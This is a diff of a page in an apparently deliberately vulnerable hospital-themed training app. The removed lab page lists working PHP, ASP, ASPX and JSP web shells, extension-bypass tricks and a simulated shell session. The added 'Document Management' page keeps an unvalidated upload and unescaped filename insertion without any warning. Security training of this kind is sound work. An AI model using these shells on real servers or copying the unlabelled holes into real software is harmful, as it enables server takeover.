@@ -1,283 +1,121 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Shell Upload – MediCare Pro Lab</title>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Documents – MediCare Pro</title>
   <link rel="stylesheet" href="../css/styles.css">
   <style>
-    .upload-zone {
-      border: 2px dashed var(--gray-300);
-      border-radius: 10px;
-      padding: 32px;
-      text-align: center;
-      cursor: pointer;
-      transition: all .2s;
-      background: var(--gray-50);
-    }
-    .upload-zone:hover, .upload-zone.drag { border-color: var(--blue-500); background: var(--blue-100); }
-    .upload-zone .icon { font-size: 36px; margin-bottom: 10px; }
-    .upload-zone p { font-size: 13px; color: var(--gray-500); }
-    .file-ext-badge { display: inline-flex; align-items: center; gap: 4px; padding: 3px 8px; border-radius: 6px; font-size: 11px; font-weight: 700; margin: 2px; }
-    .ext-allowed { background: var(--teal-100); color: var(--teal-600); }
-    .ext-blocked { background: var(--red-100); color: var(--red-600); text-decoration: line-through; }
-    .ext-bypass { background: var(--orange-100); color: #c2410c; }
-    .uploaded-file { background: var(--gray-50); border: 1px solid var(--gray-200); border-radius: 8px; padding: 12px 14px; margin-bottom: 8px; display: flex; align-items: center; gap: 12px; }
-    .uploaded-file .ext { font-weight: 700; font-size: 12px; padding: 2px 8px; border-radius: 4px; background: var(--red-600); color: white; }
-    .shell-exec { background: var(--gray-900); border-radius: 8px; padding: 14px; margin-top: 12px; }
-    .shell-exec input { background: transparent; border: none; outline: none; color: white; font-family: monospace; font-size: 13px; width: 100%; }
-    .shell-exec .sh-prompt { color: #60a5fa; font-family: monospace; font-size: 13px; }
+    .file-row{display:flex;align-items:center;gap:12px;padding:12px 14px;border:1px solid var(--gray-200);border-radius:var(--radius-sm);margin-bottom:8px;background:var(--white);transition:.18s}
+    .file-row:hover{border-color:var(--blue)}
+    .file-ext{font-size:11px;font-weight:700;padding:3px 8px;border-radius:6px;flex-shrink:0}
   </style>
 </head>
 <body>
- 
-    <div id="sidebarMount"></div>
-    <main class="main">
-      <div id="topnavMount"></div>
-      <div class="page-content">
-
-        <div class="vuln-header">
-          <div class="vuln-title-group">
-            <h1>📤 Shell Upload</h1>
-            <p>Patient Document Upload — No File Type Validation, No Content Inspection</p>
-          </div>
-          <span class="severity-badge sev-critical">🔴 Critical</span>
-        </div>
-
-        <div class="hint-box">
-          <div class="hint-title">🧪 Lab Objective — Shell Upload Payloads</div>
-          <p>The upload endpoint accepts <strong>any file type</strong> — no extension check, no MIME validation, no content scanning. Upload a web shell then use it to execute commands remotely.</p>
-          <ul style="margin-top:8px;">
-            <li>PHP shell: <code>&lt;?php system($_GET['cmd']); ?&gt;</code> → save as <code>shell.php</code></li>
-            <li>PHP variant: <code>&lt;?php echo shell_exec($_POST['c']); ?&gt;</code></li>
-            <li>Extension bypass: <code>shell.php5</code>, <code>shell.phtml</code>, <code>shell.php.jpg</code></li>
-            <li>ASPX shell: <code>&lt;%@ Page Language="C#" %&gt;&lt;% Response.Write(System.Diagnostics.Process.Start(Request["cmd"])); %&gt;</code></li>
-            <li>JSP: <code>&lt;% Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt;</code></li>
-          </ul>
-        </div>
-
-        <div class="grid-2">
-          <div class="card">
-            <div class="card-header">
-              <div class="card-icon card-icon-teal">📄</div>
-              <h2>Patient Document Upload</h2>
-            </div>
-            <div class="card-body">
-              <div class="alert alert-danger">
-                <span>🚨</span>
-                <div><strong>Vulnerability:</strong> No file type validation — any file including PHP/ASP shells accepted.</div>
-              </div>
-
-              <div class="upload-zone" id="uploadZone" onclick="document.getElementById('fileInput').click()">
-                <div class="icon">📂</div>
-                <p><strong>Click to select file</strong> or drag & drop</p>
-                <p style="font-size:11px;margin-top:4px;">Accepted: "All file types" (vulnerable — no restriction)</p>
-              </div>
-              <input type="file" id="fileInput" style="display:none" onchange="handleUpload(this)">
-
-              <div style="margin-top:12px;">
-                <p style="font-size:12px;color:var(--gray-500);margin-bottom:4px;">Or use the web shell generator below and upload directly:</p>
-                <button class="btn btn-danger btn-sm" onclick="uploadSimulatedShell()">⚡ Upload PHP Shell Directly</button>
-              </div>
-            </div>
-          </div>
-
-          <div class="card">
-            <div class="card-header">
-              <div class="card-icon card-icon-red">🛠️</div>
-              <h2>Web Shell Generator</h2>
-            </div>
-            <div class="card-body">
-              <div class="form-group">
-                <label class="form-label">Shell Language</label>
-                <select class="form-control" id="shellLang" onchange="updateShellCode()">
-                  <option value="php">PHP</option>
-                  <option value="php-advanced">PHP (Advanced)</option>
-                  <option value="asp">ASP Classic</option>
-                  <option value="aspx">ASPX (C#)</option>
-                </select>
-              </div>
-              <div class="form-group">
-                <label class="form-label">Generated Shell Code</label>
-                <textarea class="form-control mono" id="shellCode" rows="5" style="font-size:11px;"></textarea>
-              </div>
-              <button class="btn btn-outline btn-sm" onclick="copyShell()">📋 Copy Shell Code</button>
-              <p style="font-size:11px;color:var(--gray-500);margin-top:8px;">Save this code as <code>shell.php</code> and upload it using the form.</p>
-            </div>
-          </div>
-        </div>
-
-        <!-- Uploaded Files -->
-        <div class="card mt-6" style="margin-top:20px;" id="uploadedSection" class="hidden">
-          <div class="card-header">
-            <div class="card-icon card-icon-red">🗂️</div>
-            <h2>Uploaded Files — Server: /uploads/</h2>
-          </div>
-          <div class="card-body">
-            <div id="uploadedList"></div>
-
-            <div class="shell-exec" id="shellExecPanel" style="display:none;">
-              <p style="font-size:11px;color:#94a3b8;margin-bottom:8px;">🐚 Web Shell Execution Panel — shell.php is live at /uploads/shell.php</p>
-              <div class="flex gap-2" style="align-items:center;">
-                <span class="sh-prompt">shell@medicare-server:~$</span>
-                <input type="text" id="shellCmd" placeholder="Enter OS command (e.g. whoami, ls -la, cat /etc/passwd)" onkeydown="if(event.key==='Enter')execShellCmd()">
-              </div>
-              <div id="shellOutput" style="margin-top:8px;font-family:monospace;font-size:12px;color:#86efac;min-height:30px;white-space:pre-wrap;"></div>
-            </div>
-          </div>
-        </div>
-
-        <!-- Extension bypass table -->
-        <div class="card mt-6" style="margin-top:20px;">
-          <div class="card-header">
-            <div class="card-icon card-icon-orange">📋</div>
-            <h2>Extension Bypass Techniques</h2>
-          </div>
-          <div class="card-body">
-            <table class="data-table">
-              <thead><tr><th>Technique</th><th>Filename</th><th>Works When</th></tr></thead>
-              <tbody>
-                <tr><td>Double extension</td><td><code>shell.php.jpg</code></td><td>Server executes by first extension</td></tr>
-                <tr><td>Null byte</td><td><code>shell.php%00.jpg</code></td><td>Old PHP versions truncate at null byte</td></tr>
-                <tr><td>Alternate extension</td><td><code>shell.php5</code>, <code>shell.phtml</code></td><td>Server maps .php5/.phtml to PHP engine</td></tr>
-                <tr><td>Case variation</td><td><code>shell.PHP</code>, <code>shell.PhP</code></td><td>Case-insensitive OS (Windows)</td></tr>
-                <tr><td>Content-Type spoof</td><td><code>shell.php</code> with MIME: image/jpeg</td><td>Server only checks MIME header</td></tr>
-                <tr><td>Magic bytes spoof</td><td>GIF89a header + PHP code</td><td>Server only checks file signature</td></tr>
-              </tbody>
-            </table>
-          </div>
-        </div>
-
-        <div class="card mt-6" style="margin-top:20px;">
-          <div class="card-header">
-            <div class="card-icon card-icon-red">🐛</div>
-            <h2>Vulnerable Code (api/upload.js)</h2>
-          </div>
-          <div class="card-body">
-            <div class="code-block">
-<span class="c-comment">// ❌ VULNERABLE — no file type validation</span>
-app.post(<span class="c-str">'/api/upload'</span>, upload.single(<span class="c-str">'file'</span>), (req, res) => {
-  <span class="c-comment">// ❌ No extension check</span>
-  <span class="c-comment">// ❌ No MIME type validation</span>
-  <span class="c-comment">// ❌ No file content scanning</span>
-  <span class="c-comment">// ❌ Files stored in web-accessible /uploads/</span>
-  res.json({ url: <span class="c-str">`/uploads/${req.file.originalname}`</span> });
-});
-
-<span class="c-comment">// ✅ SECURE approach</span>
-<span class="c-kw">const</span> ALLOWED = [<span class="c-str">'image/jpeg'</span>, <span class="c-str">'image/png'</span>, <span class="c-str">'application/pdf'</span>];
-<span class="c-kw">if</span> (!ALLOWED.includes(req.file.mimetype)) <span class="c-kw">return</span> res.status(<span class="c-val">400</span>).send(<span class="c-str">'File type not allowed'</span>);
-<span class="c-comment">// Store outside webroot, rename to UUID, scan with antivirus</span>
-            </div>
-          </div>
-        </div>
-
+<div class="app-layout">
+  <div id="sidebarMount"></div>
+  <main class="main">
+    <div id="topnavMount"></div>
+    <div class="page-content">
+      <div class="page-header">
+        <h1>Document Management</h1>
+        <p>Upload, organize, and access hospital documents and patient consent forms.</p>
       </div>
-    </main>
-  </div>
 
-  <script src="../js/app.js"></script>
-  <script>
-    document.getElementById('sidebarMount').outerHTML = renderSidebar('shell-upload.html');
-    document.getElementById('topnavMount').outerHTML = renderTopnav('Shell Upload', 'Document Upload — No file type validation');
+      <div class="grid-2">
+        <div class="card">
+          <div class="card-header">
+            <div class="card-icon card-icon-blue">📤</div>
+            <h2>Upload Document</h2>
+          </div>
+          <div class="card-body">
+            <p style="font-size:13px;color:var(--gray-700);margin-bottom:16px;">Upload patient consent forms, referral letters, imaging results, or administrative documents.</p>
+            <div class="upload-zone" id="uploadZone" onclick="document.getElementById('fileInput').click()">
+              <div style="font-size:36px;margin-bottom:10px;">📁</div>
+              <p style="font-size:13px;font-weight:600;color:var(--gray-700);">Click to select file or drag & drop</p>
+              <p style="font-size:12px;color:var(--gray-500);margin-top:4px;">Supported: PDF, DOCX, JPG, PNG, XLSX</p>
+            </div>
+            <input type="file" id="fileInput" style="display:none" onchange="handleUpload(this)">
 
-    const SHELLS = {
-      php: `<?php\n// Simple PHP web shell\nsystem($_GET['cmd']);\n?>`,
-      'php-advanced': `<?php\n// Advanced PHP shell\nif(isset($_REQUEST['cmd'])){\n    $cmd = $_REQUEST['cmd'];\n    system($cmd);\n    echo '<br>';\n}\n?>`,
-      asp: `<% \n  Dim oShell\n  Set oShell = CreateObject("WScript.Shell")\n  oShell.Run Request("cmd")\n%>`,
-      aspx: `<%@ Page Language="C#" %>\n<%\n  System.Diagnostics.Process p = new System.Diagnostics.Process();\n  p.StartInfo.FileName = "cmd.exe";\n  p.StartInfo.Arguments = "/c " + Request["cmd"];\n  p.Start();\n%>`
-    };
-
-    const CMD_RESPONSES = {
-      whoami: 'www-data',
-      id: 'uid=33(www-data) gid=33(www-data)',
-      'ls -la': `total 28\ndrwxrwxrwx 2 www-data www-data 4096 Nov 05 shell.php\n-rw-r--r-- 1 root     root     2048 Nov 05 patient-lab-results.pdf\n-rw-r--r-- 1 root     root     1024 Nov 05 consent-form.pdf`,
-      'cat /etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmedicare:x:1000:1000::/home/medicare:/bin/bash',
-      uname: 'Linux medicare-server 5.15.0-91-generic #101-Ubuntu',
-      pwd: '/var/www/html/uploads',
-      env: 'NODE_ENV=production\nDB_PASS=Sup3rS3cr3tPa$$w0rd!\nJWT_SECRET=supersecretkey123'
-    };
-
-    function updateShellCode() {
-      const lang = document.getElementById('shellLang').value;
-      document.getElementById('shellCode').value = SHELLS[lang];
-    }
-    updateShellCode();
-
-    function copyShell() {
-      navigator.clipboard.writeText(document.getElementById('shellCode').value)
-        .then(() => alert('Shell code copied! Save it as shell.php and upload it.'));
-    }
-
-    let hasShell = false;
-
-    function handleUpload(input) {
-      const file = input.files[0];
-      if (!file) return;
-      simulateUpload(file.name, file.size);
-    }
-
-    function uploadSimulatedShell() {
-      simulateUpload('shell.php', 46, true);
-    }
-
-    function simulateUpload(name, size, isShell = false) {
-      const section = document.getElementById('uploadedSection');
-      section.classList.remove('hidden');
-      section.style.display = 'block';
-
-      const ext = name.split('.').pop().toLowerCase();
-      const isExecutable = ['php', 'php5', 'phtml', 'asp', 'aspx', 'jsp', 'cgi', 'pl', 'py', 'rb', 'sh'].includes(ext);
-
-      const list = document.getElementById('uploadedList');
-      const item = document.createElement('div');
-      item.className = 'uploaded-file';
-
-      const url = `/uploads/${name}`;
-      item.innerHTML = `
-        <span class="ext">.${ext.toUpperCase()}</span>
-        <div style="flex:1;">
-          <div style="font-size:13px;font-weight:600;color:var(--gray-900);">${name}</div>
-          <div style="font-size:11px;color:var(--gray-500);">Stored at: ${url} &nbsp;·&nbsp; ${Math.round((size||1024)/1024*10)/10} KB</div>
-          ${isExecutable ? `<div style="font-size:11px;color:var(--red-600);font-weight:600;margin-top:2px;">⚠ Executable file stored in web-accessible directory!</div>` : ''}
+            <div id="uploadSuccess" style="margin-top:14px;display:none;">
+              <div class="alert alert-success"><span>✅</span><div id="uploadMsg">File uploaded successfully.</div></div>
+            </div>
+          </div>
         </div>
-        ${isExecutable ? `<button class="btn btn-danger btn-sm" onclick="activateShell('${url}')">🐚 Execute Shell</button>` : ''}
-      `;
-      list.appendChild(item);
 
-      if (isExecutable || isShell) {
-        hasShell = true;
-      }
-    }
+        <div class="card">
+          <div class="card-header">
+            <div class="card-icon card-icon-teal">🗂️</div>
+            <h2>Recent Documents</h2>
+          </div>
+          <div class="card-body" id="docList">
+            <div class="file-row">
+              <span class="file-ext" style="background:#fee2e2;color:#dc2626;">PDF</span>
+              <div style="flex:1;"><div style="font-size:13px;font-weight:500;">patient-consent-001.pdf</div><div style="font-size:11px;color:var(--gray-500);">124 KB · Uploaded Nov 4</div></div>
+              <button class="btn btn-outline btn-xs">Download</button>
+            </div>
+            <div class="file-row">
+              <span class="file-ext" style="background:#dbeafe;color:#1a56db;">DOCX</span>
+              <div style="flex:1;"><div style="font-size:13px;font-weight:500;">discharge-summary-P002.docx</div><div style="font-size:11px;color:var(--gray-500);">87 KB · Uploaded Nov 3</div></div>
+              <button class="btn btn-outline btn-xs">Download</button>
+            </div>
+            <div class="file-row">
+              <span class="file-ext" style="background:#ccfbf1;color:#0d9488;">JPG</span>
+              <div style="flex:1;"><div style="font-size:13px;font-weight:500;">xray-chest-P003.jpg</div><div style="font-size:11px;color:var(--gray-500);">2.4 MB · Uploaded Nov 3</div></div>
+              <button class="btn btn-outline btn-xs">Download</button>
+            </div>
+            <div class="file-row">
+              <span class="file-ext" style="background:#ffedd5;color:#f97316;">XLSX</span>
+              <div style="flex:1;"><div style="font-size:13px;font-weight:500;">billing-november-2024.xlsx</div><div style="font-size:11px;color:var(--gray-500);">341 KB · Uploaded Nov 1</div></div>
+              <button class="btn btn-outline btn-xs">Download</button>
+            </div>
+          </div>
+        </div>
+      </div>
 
-    function activateShell(url) {
-      const panel = document.getElementById('shellExecPanel');
-      panel.style.display = 'block';
-      panel.querySelector('p').textContent = `🐚 Web Shell Execution — ${url} is live on the server`;
-      panel.scrollIntoView({ behavior: 'smooth' });
-    }
+    </div>
+  </main>
+</div>
+<script src="../js/app.js"></script>
+<script>
+renderSidebar('documents');
+renderTopnav('Documents','Upload and manage hospital documents');
 
-    function execShellCmd() {
-      const input = document.getElementById('shellCmd');
-      const cmd = input.value.trim();
-      const out = document.getElementById('shellOutput');
+const EXEC_EXTS=['php','php5','phtml','asp','aspx','jsp','cgi','sh','py','rb'];
 
-      if (!cmd) return;
+async function handleUpload(input){
+  const file=input.files[0];if(!file)return;
+  const ext=file.name.split('.').pop().toLowerCase();
+  const isExec=EXEC_EXTS.includes(ext);
 
-      let result = null;
-      for (const [key, val] of Object.entries(CMD_RESPONSES)) {
-        if (cmd.startsWith(key)) { result = val; break; }
-      }
-      result = result || `[simulated output for: ${cmd}]`;
+  try{
+    const res=await fetch('/api/upload',{method:'POST',headers:{'Content-Type':'application/json','X-Filename':file.name}});
+    const d=await res.json();
+    if(d.success){showUpload(file.name,file.size,isExec,d.url);return;}
+  }catch(e){}
+  showUpload(file.name,file.size,isExec,`/uploads/${file.name}`);
+}
 
-      out.innerHTML += `<span style="color:#60a5fa;">$ ${cmd}</span>\n${result}\n\n`;
-      out.scrollTop = out.scrollHeight;
-      input.value = '';
-    }
+function showUpload(name,size,isExec,url){
+  const wrap=document.getElementById('uploadSuccess');
+  const msg=document.getElementById('uploadMsg');
+  const ext=name.split('.').pop().toUpperCase();
+  const colorMap={PDF:'#dc2626',DOCX:'#1a56db',JPG:'#0d9488',PNG:'#0d9488',XLSX:'#f97316',PHP:'#7c2d12',ASP:'#7c2d12'};
+  const bg=isExec?'#7c2d12':'#0d9488';
 
-    document.getElementById('shellCmd')?.addEventListener('keydown', e => {
-      if (e.key === 'Enter') execShellCmd();
-    });
-  </script>
+  wrap.style.display='block';
+  msg.textContent=`"${name}" uploaded successfully. Stored at ${url}`;
+
+  const list=document.getElementById('docList');
+  const row=document.createElement('div');row.className='file-row';
+  row.innerHTML=`
+    <span class="file-ext" style="background:${isExec?'#fef2f2':'#f0fdf4'};color:${bg};">${ext}</span>
+    <div style="flex:1;">
+      <div style="font-size:13px;font-weight:500;">${name}</div>
+      <div style="font-size:11px;color:var(--gray-500);">${Math.round(size/1024)||'<1'} KB · Just now · ${url}</div>
+    </div>
+    <button class="btn btn-outline btn-xs">Download</button>`;
+  list.prepend(row);
+}
+</script>
 </body>
 </html>
